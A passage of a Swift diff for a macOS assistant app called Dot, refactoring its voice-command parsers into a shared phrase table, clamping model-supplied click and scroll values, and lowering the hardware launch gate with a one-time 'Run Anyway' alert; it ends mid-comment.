@@ -1,11 +1,96 @@
 import Foundation
 import CoreFoundation
+import CryptoKit
 #if canImport(AppKit)
 import AppKit
 #endif
 #if canImport(EventKit)
 import EventKit
 #endif
+
+// MARK: - Shared helpers
+
+/// One ordered phrase table standing in for hand-written `if lower == "…"` chains. The first rule
+/// that matches wins, so overlapping synonyms keep exactly the precedence they had inline.
+struct PhraseMatcher<Command> {
+    /// Either exact phrase synonyms, or a prefix rule that receives the remainder of the original
+    /// and of the lowercased text and declines by returning nil.
+    enum Rule {
+        case phrases([String], Command)
+        case prefix(String, (String, String) -> Command?)
+    }
+    private let rules: [Rule]
+    init(_ rules: Rule...) { self.rules = rules }
+    func match(_ text: String) -> Command? {
+        let lower = text.lowercased().trimmingCharacters(in: .whitespacesAndNewlines)
+        for rule in rules {
+            switch rule {
+            case .phrases(let phrases, let command) where phrases.contains(lower):
+                return command
+            case .prefix(let prefix, let build) where lower.hasPrefix(prefix):
+                if let command = build(String(text.dropFirst(prefix.count)), String(lower.dropFirst(prefix.count))) { return command }
+            default:
+                continue
+            }
+        }
+        return nil
+    }
+}
+
+/// Strips each conversational filler at most once, in order, exactly as the inlined loops did.
+/// Every call site keeps its own list: the fillers genuinely differ between intents.
+func stripConversationalPrefixes(_ text: String, prefixes: [String]) -> String {
+    var working = text
+    for prefix in prefixes where working.lowercased().hasPrefix(prefix) {
+        working = String(working.dropFirst(prefix.count)).trimmingCharacters(in: .whitespacesAndNewlines)
+    }
+    return working
+}
+
+/// The sentence punctuation the conversational parsers ignore.
+func trimConversationalPunctuation(_ text: String) -> String {
+    text.trimmingCharacters(in: CharacterSet(charactersIn: "?!.,:;\"'"))
+}
+
+/// The one read-to-EOF subprocess shape: launch, wait for exit, then drain the pipe. Callers keep
+/// their own decoding, trimming, limits and error text so no reply string changes.
+enum SubprocessRunner {
+    struct Output { let data: Data; let status: Int32 }
+    static func run(executable: String, arguments: [String], mergeStandardError: Bool = false) throws -> Output {
+        let process = Process()
+        process.executableURL = URL(fileURLWithPath: executable)
+        process.arguments = arguments
+        let pipe = Pipe()
+        process.standardOutput = pipe
+        if mergeStandardError { process.standardError = pipe }
+        try process.run()
+        process.waitUntilExit()
+        return Output(data: pipe.fileHandleForReading.readDataToEndOfFile(), status: process.terminationStatus)
+    }
+}
+
+extension Sequence where Element == UInt8 {
+    /// Lowercase two-digit-per-byte hex.
+    var hexString: String { map { String(format: "%02x", $0) }.joined() }
+}
+
+extension Data {
+    /// Lowercase 64-character SHA-256 hex digest.
+    var sha256Hex: String { SHA256.hash(data: self).hexString }
+}
+
+extension String {
+    /// The longest prefix that is at most `bytes` UTF-8 bytes and ends on a scalar boundary.
+    func truncated(toUTF8Bytes bytes: Int) -> String {
+        let prefix = Array(utf8.prefix(bytes))
+        var end = prefix.count
+        while end > 0 {
+            if let value = String(bytes: prefix[..<end], encoding: .utf8) { return value }
+            end -= 1
+        }
+        return ""
+    }
+}
 
 /// Pure, deterministic rules shared by the app and its XCTest target.
 struct TurnGate {
@@ -143,7 +228,10 @@ struct CapturedScreenImage: Sendable {
     let turn: UUID
     let acquiredAt: Double
     private let encodedDataURL: String
-    static let maximumAge: Double = 5
+    /// Documented freshness window (docs/BUILD_CHECKLIST.md: "Extended freshness window to 15s to
+    /// eliminate false-stale drops during reasoning/warmup"). One named constant, honored by every
+    /// freshness check above and asserted by `ScreenContextTests`.
+    static let maximumAge: Double = 15
 
     fileprivate init(turn: UUID, acquiredAt: Double, dataURL: String) {
         self.turn = turn; self.acquiredAt = acquiredAt; encodedDataURL = dataURL
@@ -536,6 +624,37 @@ struct QuestionReplyGate {
     }
 }
 
+/// Bounds for model-supplied integers. The advertised tool schemas are advisory only: a local
+/// model can emit any number, so every numeric argument is clamped at the parse boundary and
+/// again at the engine entry point before it can drive a loop or an `Int32` conversion.
+enum ToolNumericBounds {
+    static let clicks = 1...3
+    static let scrollAmount = 1...50
+
+    /// Clamps a JSON number without ever converting an out-of-range `Double` to `Int`.
+    static func clamped(_ value: NSNumber?, to range: ClosedRange<Int>, default fallback: Int) -> Int {
+        guard let value, CFGetTypeID(value) != CFBooleanGetTypeID() else { return fallback }
+        let raw = value.doubleValue
+        guard raw.isFinite else { return fallback }
+        let rounded = raw.rounded()
+        if rounded <= Double(range.lowerBound) { return range.lowerBound }
+        if rounded >= Double(range.upperBound) { return range.upperBound }
+        return Int(rounded)
+    }
+    static func clampedClicks(_ value: NSNumber?) -> Int { clamped(value, to: clicks, default: 1) }
+    static func clampedScrollAmount(_ value: NSNumber?) -> Int { clamped(value, to: scrollAmount, default: 6) }
+
+    static func clampedClicks(_ value: Int) -> Int { min(max(value, clicks.lowerBound), clicks.upperBound) }
+    static func clampedScrollAmount(_ value: Int) -> Int { min(max(value, scrollAmount.lowerBound), scrollAmount.upperBound) }
+
+    /// Pure arithmetic for `CGEvent` scroll deltas: the magnitude is clamped before the `Int32`
+    /// conversion, which would otherwise trap for values above `Int32.max`.
+    static func scrollDelta(amount: Int, inverted: Bool) -> Int32 {
+        let magnitude = clampedScrollAmount(amount)
+        return Int32(clamping: inverted ? -magnitude : magnitude)
+    }
+}
+
 /// Strict parser for the pinned Splash streamed tool-call contract. It grants no microphone authority.
 /// The controller still needs same-turn success plus the final question's actual playback completion.
 struct QuestionIntentStream {
@@ -681,7 +800,8 @@ struct QuestionIntentStream {
             guard let x = (object["x"] as? NSNumber)?.doubleValue,
                   let y = (object["y"] as? NSNumber)?.doubleValue else { throw Failure.invalid }
             let button = (object["button"] as? String) ?? "left"
-            let clicks = (object["clicks"] as? NSNumber)?.intValue ?? 1
+            // Schema advertises 1...3; the model is not trusted to respect it.
+            let clicks = ToolNumericBounds.clampedClicks(object["clicks"] as? NSNumber)
             return .clickPoint(x: x, y: y, button: button, clicks: clicks)
         case "point_on_screen":
             guard let x = (object["x"] as? NSNumber)?.doubleValue,
@@ -690,7 +810,8 @@ struct QuestionIntentStream {
             return .pointOnScreen(x: x, y: y, label: label)
         case "scroll_screen":
             let dir = (object["direction"] as? String) ?? "down"
-            let amt = (object["amount"] as? NSNumber)?.intValue ?? 6
+            // Schema advertises 1...50; the model is not trusted to respect it.
+            let amt = ToolNumericBounds.clampedScrollAmount(object["amount"] as? NSNumber)
             return .scrollScreen(direction: dir, amount: amt)
         case "snap_window":
             guard let layout = object["layout"] as? String, !layout.isEmpty else { throw Failure.invalid }
@@ -765,8 +886,62 @@ struct FinalPlaybackBarrier {
 }
 
 /// Hardware requirements verification and production launch gate.
-/// Target Minimum Specification: Apple Silicon M4 Pro, M5, or newer, 48 GB Unified Memory, macOS 27.
+/// Documented product target (README.md): M4 Pro-class or newer with at least 36 GB RAM, with
+/// 48 GB recommended; the complete Splash runtime requires macOS 26.4+. 48 GB and macOS 27+ stay
+/// advisory text and never block a launch.
 public struct HardwareCompatibility: Sendable {
+    /// Minimum Unified Memory that satisfies the documented product target.
+    public static let minimumRAMGB = 36
+    /// Advisory (recommended) Unified Memory; never a launch gate.
+    public static let recommendedRAMGB = 48
+    /// Minimum OS that satisfies the documented product target (macOS 26.4+).
+    public static let minimumOSMajor = 26
+    public static let minimumOSMinor = 4
+    /// Advisory (recommended) OS major version; never a launch gate.
+    public static let recommendedOSMajor = 27
+    /// Persisted acknowledgement so the below-minimum warning is shown once, not on every launch.
+    public static let belowSpecAcknowledgementKey = "dotHardwareBelowSpecAcknowledged"
+    public static let runAnywayButtonTitle = "Run Anyway"
+    public static let stopButtonTitle = "Stop"
+
+    /// Pure, testable description of a launch alert. AppKit presentation only applies this plan,
+    /// so button order and the Return-key button are covered by portable tests.
+    public struct LaunchAlertPlan: Equatable, Sendable {
+        public let title: String
+        public let informativeText: String
+        public let buttons: [String]
+        public let defaultButtonIndex: Int
+        public let isCritical: Bool
+
+        public init(title: String, informativeText: String, buttons: [String], defaultButtonIndex: Int, isCritical: Bool) {
+            self.title = title
+            self.informativeText = informativeText
+            self.buttons = buttons
+            self.defaultButtonIndex = defaultButtonIndex
+            self.isCritical = isCritical
+        }
+
+        public var defaultButtonTitle: String {
+            buttons.indices.contains(defaultButtonIndex) ? buttons[defaultButtonIndex] : ""
+        }
+    }
+
+    /// Launch outcome. `warnBelowSpec` is presented at most once per acknowledgement;
+    /// `refuseImpossible` is the only case that ends the process.
+    public enum LaunchGate: Equatable, Sendable {
+        case proceed
+        case warnBelowSpec(LaunchAlertPlan)
+        case refuseImpossible(LaunchAlertPlan)
+    }
+
+    public static func hasAcknowledgedBelowSpec(in defaults: UserDefaults = .standard) -> Bool {
+        defaults.bool(forKey: belowSpecAcknowledgementKey)
+    }
+
+    public static func acknowledgeBelowSpec(in defaults: UserDefaults = .standard) {
+        defaults.set(true, forKey: belowSpecAcknowledgementKey)
+    }
+
     public struct SystemInfo: Equatable, Sendable {
         public let chip: String
         public let ramGB: Int
@@ -803,12 +978,15 @@ public struct HardwareCompatibility: Sendable {
             return false
         }
 
+        /// Minimum specification: the documented 36 GB product target.
         public var meetsRAMSpec: Bool {
-            ramGB >= 48
+            ramGB >= HardwareCompatibility.minimumRAMGB
         }
 
+        /// Minimum specification: macOS 26.4+, or any later major release.
         public var meetsOSSpec: Bool {
-            osMajor >= 27
+            osMajor > HardwareCompatibility.minimumOSMajor
+                || (osMajor == HardwareCompatibility.minimumOSMajor && osMinor >= HardwareCompatibility.minimumOSMinor)
         }
 
         public var meetsAllSpecs: Bool {
@@ -828,16 +1006,33 @@ public struct HardwareCompatibility: Sendable {
             return nil
         }
 
+        /// Advisory-only notes for hardware that meets the minimum but not the recommendation.
+        /// These never gate a launch.
+        public var advisoryNotes: [String] {
+            var notes: [String] = []
+            if !meetsChipSpec {
+                notes.append("Processor (\(chip)) is below recommended M4 Pro, M5 or newer.")
+            }
+            if ramGB < HardwareCompatibility.recommendedRAMGB {
+                notes.append("Unified Memory (\(ramGB) GB) is below recommended \(HardwareCompatibility.recommendedRAMGB) GB.")
+            }
+            if osMajor < HardwareCompatibility.recommendedOSMajor {
+                notes.append("Operating System (macOS \(osString)) is below recommended macOS \(HardwareCompatibility.recommendedOSMajor).")
+            }
+            return notes
+        }
+
+        /// Reasons the minimum specification is not met (chip class or the 36 GB / macOS 26.4 floor).
         public var belowSpecReasons: [String] {
             var reasons: [String] = []
             if !meetsChipSpec {
                 reasons.append("Processor (\(chip)) is below recommended M4 Pro, M5 or newer.")
             }
             if !meetsRAMSpec {
-                reasons.append("Unified Memory (\(ramGB) GB) is below recommended 48 GB.")
+                reasons.append("Unified Memory (\(ramGB) GB) is below the required \(HardwareCompatibility.minimumRAMGB) GB minimum (48 GB recommended).")
             }
             if !meetsOSSpec {
-                reasons.append("Operating System (macOS \(osString)) is below recommended macOS 27.")
+                reasons.append("Operating System (macOS \(osString)) is below the required macOS \(HardwareCompatibility.minimumOSMajor).\(HardwareCompatibility.minimumOSMinor) (macOS \(HardwareCompatibility.recommendedOSMajor) recommended).")
             }
             return reasons
         }
@@ -892,69 +1087,116 @@ public struct HardwareCompatibility: Sendable {
     public static func statusSummary(info: SystemInfo = queryCurrent()) -> String {
         switch evaluate(info: info) {
         case .compatible(let current):
-            return "Hardware fully compatible! Your Mac (\(current.chip), \(current.ramGB) GB Unified Memory, macOS \(current.osString)) meets all target minimum specifications (Apple Silicon M4 Pro or M5+, 48 GB RAM, macOS 27+)."
+            let baseline = "Hardware meets the target minimum specification: \(current.chip), \(current.ramGB) GB Unified Memory, macOS \(current.osString). Minimum is Apple Silicon with \(minimumRAMGB) GB Unified Memory and macOS \(minimumOSMajor).\(minimumOSMinor)."
+            let advisories = current.advisoryNotes
+            guard !advisories.isEmpty else {
+                return baseline + " Recommended configuration (M4 Pro or M5+, \(recommendedRAMGB) GB RAM, macOS \(recommendedOSMajor)+) is met."
+            }
+            return baseline + " Advisory: " + advisories.joined(separator: " ")
         case .belowMinimum(let current, let reasons):
             let details = reasons.joined(separator: " ")
-            return "Hardware below target minimum specification: \(current.chip), \(current.ramGB) GB Unified Memory, macOS \(current.osString). \(details) Target minimum is Apple Silicon M4 Pro or M5+, 48 GB Unified Memory, and macOS 27."
+            return "Hardware below target minimum specification: \(current.chip), \(current.ramGB) GB Unified Memory, macOS \(current.osString). \(details) Minimum is Apple Silicon with \(minimumRAMGB) GB Unified Memory and macOS \(minimumOSMajor).\(minimumOSMinor); recommended is M4 Pro or M5+, \(recommendedRAMGB) GB Unified Memory, and macOS \(recommendedOSMajor)."
         case .technicallyImpossible(let current, let reason):
             return "Hardware incompatible: \(current.chip), \(current.ramGB) GB RAM, macOS \(current.osString). Reason: \(reason)"
         }
     }
 
+    /// Pure launch-gate decision. The below-minimum warning is presented once per acknowledgement;
+    /// only a technically impossible machine refuses to launch. `proceed` covers both the compatible
+    /// case and a previously acknowledged override.
+    public static func launchGate(info: SystemInfo = queryCurrent(), defaults: UserDefaults = .standard) -> LaunchGate {
+        switch evaluate(info: info) {
+        case .compatible:
+            return .proceed
+        case .belowMinimum(let detected, let reasons):
+            guard !hasAcknowledgedBelowSpec(in: defaults) else { return .proceed }
+            return .warnBelowSpec(belowMinimumPlan(info: detected, reasons: reasons))
+        case .technicallyImpossible(let detected, let reason):
+            return .refuseImpossible(impossiblePlan(info: detected, reason: reason))
+        }
+    }
+
+    /// Minimum specification now matches the documented product target (36 GB, macOS 26.4+);
+    /// 48 GB and macOS 27+ stay advisory. "Run Anyway" is the default/Return button.
+    public static func belowMinimumPlan(info: SystemInfo, reasons: [String]) -> LaunchAlertPlan {
+        let items = reasons.map { "• " + $0 }.joined(separator: "\n")
+        let advisories = info.advisoryNotes.map { "• " + $0 }.joined(separator: "\n")
+        var text = "Running Dot on this hardware is below the recommended configuration. You may experience slow responses or heavy memory pressure.\n\n" +
+            "Target Minimum Specification:\n" +
+            "• Apple Silicon\n" +
+            "• \(minimumRAMGB) GB Unified Memory\n" +
+            "• macOS \(minimumOSMajor).\(minimumOSMinor) or newer\n\n" +
+            "Detected on this Mac:\n" +
+            "• Processor: \(info.chip)\n" +
+            "• Memory: \(info.ramGB) GB Unified Memory\n" +
+            "• Operating System: macOS \(info.osString)\n\n" +
+            "Items below specification:\n" +
+            items + "\n\n"
+        if !advisories.isEmpty {
+            text += "Advisory (recommended, not required):\n" + advisories + "\n\n"
+        }
+        text += "Choose \(runAnywayButtonTitle) to continue; Dot will not ask again. Choose \(stopButtonTitle) to quit."
+        return LaunchAlertPlan(title: "Hardware Below Recommended Specification",
+                               informativeText: text,
+                               buttons: [runAnywayButtonTitle, stopButtonTitle],
+                               defaultButtonIndex: 0,
+                               isCritical: false)
+    }
+
+    public static func impossiblePlan(info: SystemInfo, reason: String) -> LaunchAlertPlan {
+        LaunchAlertPlan(title: "Hardware Incompatible with Dot",
+                        informativeText: "Dot cannot run on this machine.\n\n" +
+                            "Detected:\n" +
+                            "• Processor: \(info.chip)\n" +
+                            "• Memory: \(info.ramGB) GB Unified Memory\n" +
+                            "• Operating System: macOS \(info.osString)\n\n" +
+                            "Reason:\n\(reason)\n\n" +
+                            "Required:\n" +
+                            "• Apple Silicon (Intel is unsupported)\n" +
+                            "• 24 GB Unified Memory or more\n" +
+                            "• macOS 15 or newer",
+                        buttons: ["Quit"],
+                        defaultButtonIndex: 0,
+                        isCritical: true)
+    }
+
     #if canImport(AppKit)
+    /// The single place a plan becomes AppKit: button order and the Return-key button come from the
+    /// plan, so the plan itself is what portable tests assert.
+    @MainActor
+    public static func makeAlert(from plan: LaunchAlertPlan) -> NSAlert {
+        let alert = NSAlert()
+        alert.alertStyle = plan.isCritical ? .critical : .warning
+        alert.messageText = plan.title
+        alert.informativeText = plan.informativeText
+        for (index, title) in plan.buttons.enumerated() {
+            let button = alert.addButton(withTitle: title)
+            button.keyEquivalent = index == plan.defaultButtonIndex ? "\r" : ""
+        }
+        return alert
+    }
+
     @MainActor
     public static func verifyOnLaunch() -> Bool {
-        let status = evaluate()
-        switch status {
-        case .compatible:
+        switch launchGate() {
+        case .proceed:
             return true
 
-        case .belowMinimum(let info, let reasons):
+        case .warnBelowSpec(let plan):
             NSApp.activate(ignoringOtherApps: true)
-            let alert = NSAlert()
-            alert.alertStyle = .warning
-            alert.messageText = "Hardware Below Target Specification"
-            let items = reasons.map { "• " + $0 }.joined(separator: "\n")
-            alert.informativeText = "Running Dot on this hardware is not recommended. You may experience slow responses or heavy memory pressure.\n\n" +
-                "Target Minimum Specification:\n" +
-                "• Apple Silicon M4 Pro, M5, or newer\n" +
-                "• 48 GB Unified Memory\n" +
-                "• macOS 27 or newer\n\n" +
-                "Detected on this Mac:\n" +
-                "• Processor: \(info.chip)\n" +
-                "• Memory: \(info.ramGB) GB Unified Memory\n" +
-                "• Operating System: macOS \(info.osString)\n\n" +
-                "Items below specification:\n" +
-                items + "\n\n" +
-                "Would you like to stop or run anyway?"
-            let stopButton = alert.addButton(withTitle: "Stop")
-            stopButton.keyEquivalent = "\r"
-            alert.addButton(withTitle: "Run Anyway")
-
-            let response = alert.runModal()
-            if response == .alertFirstButtonReturn {
+            let response = makeAlert(from: plan).runModal()
+            let chosen = response.rawValue - NSApplication.ModalResponse.alertFirstButtonReturn.rawValue
+            guard chosen == plan.defaultButtonIndex else {
+                // Only an explicit Stop ends the app; the default (Return) button continues.
                 NSApplication.shared.terminate(nil)
                 return false
             }
+            acknowledgeBelowSpec()
             return true
 
-        case .technicallyImpossible(let info, let reason):
+        case .refuseImpossible(let plan):
             NSApp.activate(ignoringOtherApps: true)
-            let alert = NSAlert()
-            alert.alertStyle = .critical
-            alert.messageText = "Hardware Incompatible with Dot"
-            alert.informativeText = "Dot cannot run on this machine.\n\n" +
-                "Detected:\n" +
-                "• Processor: \(info.chip)\n" +
-                "• Memory: \(info.ramGB) GB Unified Memory\n" +
-                "• Operating System: macOS \(info.osString)\n\n" +
-                "Reason:\n\(reason)\n\n" +
-                "Target Minimum Specification:\n" +
-                "• Apple Silicon M4 Pro, M5, or newer\n" +
-                "• 48 GB Unified Memory\n" +
-                "• macOS 27 or newer"
-            alert.addButton(withTitle: "Quit")
-            alert.runModal()
+            makeAlert(from: plan).runModal()
             NSApplication.shared.terminate(nil)
             return false
         }
@@ -968,26 +1210,24 @@ public struct HardwareCompatibility: Sendable {
         switch status {
         case .compatible(let info):
             alert.alertStyle = .informational
-            alert.messageText = "Hardware Fully Compatible"
-            alert.informativeText = "Your Mac meets or exceeds all target minimum specifications for Dot.\n\n" +
-                "• Processor: \(info.chip) (M4 Pro, M5 or newer)\n" +
-                "• Memory: \(info.ramGB) GB Unified Memory (48 GB minimum)\n" +
-                "• Operating System: macOS \(info.osString) (macOS 27+)\n\n" +
+            alert.messageText = "Hardware Compatible"
+            alert.informativeText = "Your Mac meets the target minimum specification for Dot.\n\n" +
+                "• Processor: \(info.chip) (M4 Pro, M5 or newer recommended)\n" +
+                "• Memory: \(info.ramGB) GB Unified Memory (\(minimumRAMGB) GB minimum, \(recommendedRAMGB) GB recommended)\n" +
+                "• Operating System: macOS \(info.osString) (macOS \(minimumOSMajor).\(minimumOSMinor)+ required, macOS \(recommendedOSMajor)+ recommended)\n\n" +
                 "Dot runs the local Qwen 3.8 27B 4-bit model at optimal performance."
-            alert.addButton(withTitle: "OK")
 
         case .belowMinimum(let info, let reasons):
             alert.alertStyle = .warning
-            alert.messageText = "Hardware Below Target Specification"
+            alert.messageText = "Hardware Below Recommended Specification"
             let items = reasons.map { "• " + $0 }.joined(separator: "\n")
-            alert.informativeText = "Target Minimum: Apple Silicon M4 Pro/M5+, 48 GB Unified Memory, macOS 27+\n\n" +
+            alert.informativeText = "Target Minimum: Apple Silicon, \(minimumRAMGB) GB Unified Memory, macOS \(minimumOSMajor).\(minimumOSMinor)+ (recommended: M4 Pro/M5+, \(recommendedRAMGB) GB, macOS \(recommendedOSMajor)+)\n\n" +
                 "Detected on this Mac:\n" +
                 "• Processor: \(info.chip)\n" +
                 "• Memory: \(info.ramGB) GB Unified Memory\n" +
                 "• Operating System: macOS \(info.osString)\n\n" +
                 "Notes:\n\(items)\n\n" +
                 "(Running under user override)"
-            alert.addButton(withTitle: "OK")
 
         case .technicallyImpossible(let info, let reason):
             alert.alertStyle = .critical
@@ -997,8 +1237,8 @@ public struct HardwareCompatibility: Sendable {
                 "• Processor: \(info.chip)\n" +
                 "• Memory: \(info.ramGB) GB\n" +
                 "• macOS: \(info.osString)"
-            alert.addButton(withTitle: "OK")
         }
+        alert.addButton(withTitle: "OK")
         alert.runModal()
     }
     #endif
@@ -1269,29 +1509,20 @@ public enum ClipboardCommand: Equatable {
 }
 
 public enum ClipboardIntelligence {
+    private static let matcher = PhraseMatcher<ClipboardCommand>(
+        .phrases(["clipboard", "read clipboard", "what is on my clipboard", "show clipboard", "check clipboard"], .read),
+        .phrases(["clear clipboard", "empty clipboard"], .clear),
+        .prefix("copy to clipboard ") { text, _ in
+            .copy(text: text.trimmingCharacters(in: .whitespacesAndNewlines))
+        },
+        .phrases(["summarize clipboard", "summarize my clipboard"], .summarize),
+        .phrases(["explain clipboard", "explain my clipboard", "explain code on clipboard"], .explain),
+        .prefix("translate clipboard to ") { _, lower in
+            .translate(language: lower.trimmingCharacters(in: .whitespacesAndNewlines))
+        }
+    )
     public static func parseCommand(_ text: String) -> ClipboardCommand {
-        let lower = text.lowercased().trimmingCharacters(in: .whitespacesAndNewlines)
-        if lower == "clipboard" || lower == "read clipboard" || lower == "what is on my clipboard" || lower == "show clipboard" || lower == "check clipboard" {
-            return .read
-        }
-        if lower == "clear clipboard" || lower == "empty clipboard" {
-            return .clear
-        }
-        if lower.hasPrefix("copy to clipboard ") {
-            let content = String(text.dropFirst("copy to clipboard ".count)).trimmingCharacters(in: .whitespacesAndNewlines)
-            return .copy(text: content)
-        }
-        if lower == "summarize clipboard" || lower == "summarize my clipboard" {
-            return .summarize
-        }
-        if lower == "explain clipboard" || lower == "explain my clipboard" || lower == "explain code on clipboard" {
-            return .explain
-        }
-        if lower.hasPrefix("translate clipboard to ") {
-            let lang = String(lower.dropFirst("translate clipboard to ".count)).trimmingCharacters(in: .whitespacesAndNewlines)
-            return .translate(language: lang)
-        }
-        return .none
+        matcher.match(text) ?? .none
     }
 
     public static func read() -> String? {
@@ -1332,34 +1563,23 @@ public enum SystemControlCommand: Equatable {
 }
 
 public enum SystemControlSuite {
+    private static let fileName: (String, String) -> SystemControlCommand? = { text, _ in
+        let name = text.trimmingCharacters(in: .whitespacesAndNewlines)
+        return name.isEmpty ? nil : .findFile(name: name)
+    }
+    private static let matcher = PhraseMatcher<SystemControlCommand>(
+        .phrases(["toggle dark mode", "switch dark mode"], .toggleDarkMode),
+        .phrases(["dark mode on", "enable dark mode", "turn on dark mode"], .setDarkMode(enabled: true)),
+        .phrases(["dark mode off", "disable dark mode", "turn off dark mode", "light mode"], .setDarkMode(enabled: false)),
+        .phrases(["mute", "mute volume", "mute audio", "silence audio"], .muteVolume),
+        .phrases(["unmute", "unmute volume", "unmute audio"], .unmuteVolume),
+        .phrases(["lock screen", "lock mac", "lock my mac"], .lockScreen),
+        .prefix("find file ", fileName),
+        .prefix("locate file ", fileName),
+        .prefix("search file ", fileName)
+    )
     public static func parseCommand(_ text: String) -> SystemControlCommand {
-        let lower = text.lowercased().trimmingCharacters(in: .whitespacesAndNewlines)
-        if lower == "toggle dark mode" || lower == "switch dark mode" {
-            return .toggleDarkMode
-        }
-        if lower == "dark mode on" || lower == "enable dark mode" || lower == "turn on dark mode" {
-            return .setDarkMode(enabled: true)
-        }
-        if lower == "dark mode off" || lower == "disable dark mode" || lower == "turn off dark mode" || lower == "light mode" {
-            return .setDarkMode(enabled: false)
-        }
-        if lower == "mute" || lower == "mute volume" || lower == "mute audio" || lower == "silence audio" {
-            return .muteVolume
-        }
-        if lower == "unmute" || lower == "unmute volume" || lower == "unmute audio" {
-            return .unmuteVolume
-        }
-        if lower == "lock screen" || lower == "lock mac" || lower == "lock my mac" {
-            return .lockScreen
-        }
-        if lower.hasPrefix("find file ") || lower.hasPrefix("locate file ") || lower.hasPrefix("search file ") {
-            let prefix = lower.hasPrefix("find file ") ? "find file " : (lower.hasPrefix("locate file ") ? "locate file " : "search file ")
-            let name = String(text.dropFirst(prefix.count)).trimmingCharacters(in: .whitespacesAndNewlines)
-            if !name.isEmpty {
-                return .findFile(name: name)
-            }
-        }
-        return .none
+        matcher.match(text) ?? .none
     }
 
     #if canImport(AppKit)
@@ -1411,15 +1631,8 @@ public enum SystemControlSuite {
     }
 
     public static func findFilesSpotlight(named: String, limit: Int = 5) -> [String] {
-        let process = Process()
-        process.executableURL = URL(fileURLWithPath: "/usr/bin/mdfind")
-        process.arguments = ["-name", named]
-        let pipe = Pipe()
-        process.standardOutput = pipe
         do {
-            try process.run()
-            process.waitUntilExit()
-            let data = pipe.fileHandleForReading.readDataToEndOfFile()
+            let data = try SubprocessRunner.run(executable: "/usr/bin/mdfind", arguments: ["-name", named]).data
             let output = String(decoding: data, as: UTF8.self)
             let lines = output.components(separatedBy: "\n")
                 .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
@@ -1696,16 +1909,10 @@ public enum InPlaceAppTyping {
         let trimmed = text.trimmingCharacters(in: .whitespacesAndNewlines)
         guard !trimmed.isEmpty, trimmed.count <= 2000 else { return .none }
 
-        var working = trimmed
-        let politePrefixes = [
+        let working = stripConversationalPrefixes(trimmed, prefixes: [
             "can you please ", "could you please ", "can you ", "could you ", "would you ",
             "please ", "hey dot, ", "hey dot ", "dot, ", "dot ", "just "
-        ]
-        for prefix in politePrefixes {
-            if working.lowercased().hasPrefix(prefix) {
-                working = String(working.dropFirst(prefix.count)).trimmingCharacters(in: .whitespacesAndNewlines)
-            }
-        }
+        ])
 
         let lower = working.lowercased()
 
@@ -2104,27 +2311,16 @@ public enum WindowSnapLayout: String, Equatable, Sendable {
 }
 
 public enum WindowLayoutManager {
+    private static let matcher = PhraseMatcher<WindowSnapLayout>(
+        .phrases(["snap window left", "snap left", "window left half", "tile window left"], .leftHalf),
+        .phrases(["snap window right", "snap right", "window right half", "tile window right"], .rightHalf),
+        .phrases(["snap window top", "window top half"], .topHalf),
+        .phrases(["snap window bottom", "window bottom half"], .bottomHalf),
+        .phrases(["maximize window", "fullscreen window", "expand window"], .maximize),
+        .phrases(["center window", "center active window"], .center)
+    )
     public static func parseCommand(_ text: String) -> WindowSnapLayout? {
-        let lower = text.lowercased().trimmingCharacters(in: .whitespacesAndNewlines)
-        if lower == "snap window left" || lower == "snap left" || lower == "window left half" || lower == "tile window left" {
-            return .leftHalf
-        }
-        if lower == "snap window right" || lower == "snap right" || lower == "window right half" || lower == "tile window right" {
-            return .rightHalf
-        }
-        if lower == "snap window top" || lower == "window top half" {
-            return .topHalf
-        }
-        if lower == "snap window bottom" || lower == "window bottom half" {
-            return .bottomHalf
-        }
-        if lower == "maximize window" || lower == "fullscreen window" || lower == "expand window" {
-            return .maximize
-        }
-        if lower == "center window" || lower == "center active window" {
-            return .center
-        }
-        return nil
+        matcher.match(text)
     }
 
     public static func targetFrame(for layout: WindowSnapLayout, in visibleFrame: CGRect) -> CGRect {
@@ -2218,18 +2414,13 @@ public enum SimulatorCommand: Equatable, Sendable {
 }
 
 public enum SimulatorControlSuite {
+    private static let matcher = PhraseMatcher<SimulatorCommand>(
+        .phrases(["list simulators", "booted simulators", "check simulator", "simulator status"], .listBooted),
+        .phrases(["open simulator", "launch simulator", "start simulator"], .openSimulatorApp),
+        .phrases(["simulator screenshot", "take simulator screenshot"], .screenshot)
+    )
     public static func parseCommand(_ text: String) -> SimulatorCommand {
-        let lower = text.lowercased().trimmingCharacters(in: .whitespacesAndNewlines)
-        if lower == "list simulators" || lower == "booted simulators" || lower == "check simulator" || lower == "simulator status" {
-            return .listBooted
-        }
-        if lower == "open simulator" || lower == "launch simulator" || lower == "start simulator" {
-            return .openSimulatorApp
-        }
-        if lower == "simulator screenshot" || lower == "take simulator screenshot" {
-            return .screenshot
-        }
-        return .none
+        matcher.match(text) ?? .none
     }
 
     #if canImport(AppKit)
@@ -2237,15 +2428,8 @@ public enum SimulatorControlSuite {
     public static func execute(_ command: SimulatorCommand) -> String? {
         switch command {
         case .listBooted:
-            let process = Process()
-            process.executableURL = URL(fileURLWithPath: "/usr/bin/xcrun")
-            process.arguments = ["simctl", "list", "devices", "booted"]
-            let pipe = Pipe()
-            process.standardOutput = pipe
             do {
-                try process.run()
-                process.waitUntilExit()
-                let data = pipe.fileHandleForReading.readDataToEndOfFile()
+                let data = try SubprocessRunner.run(executable: "/usr/bin/xcrun", arguments: ["simctl", "list", "devices", "booted"]).data
                 let output = String(decoding: data, as: UTF8.self)
                 let booted = output.components(separatedBy: "\n")
                     .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
@@ -2383,17 +2567,117 @@ public enum LaserPointerCommand: Equatable {
 }
 
 public enum LaserPointerParser {
+    private static let matcher = PhraseMatcher<LaserPointerCommand>(
+        .phrases(["point", "laser pointer", "show pointer", "where are you looking", "point here"], .pointToCenter),
+        .phrases(["highlight window", "highlight active window", "outline window"], .highlightActiveWindow)
+    )
     public static func parse(_ text: String) -> LaserPointerCommand {
-        let lower = text.lowercased().trimmingCharacters(in: .whitespacesAndNewlines)
-        if lower == "point" || lower == "laser pointer" || lower == "show pointer" || lower == "where are you looking" || lower == "point here" {
-            return .pointToCenter
-        }
-        if lower == "highlight window" || lower == "highlight active window" || lower == "outline window" {
-            return .highlightActiveWindow
-        }
-        return .none
+        matcher.match(text) ?? .none
     }
 }
+
+/// Explicit mapping between the two global display coordinate spaces macOS mixes:
+/// CoreGraphics/Vision report top-left origins with y increasing downward (`CGEvent`,
+/// `CGWarpMouseCursorPosition`, `VNRecognizedTextObservation`), while AppKit reports bottom-left
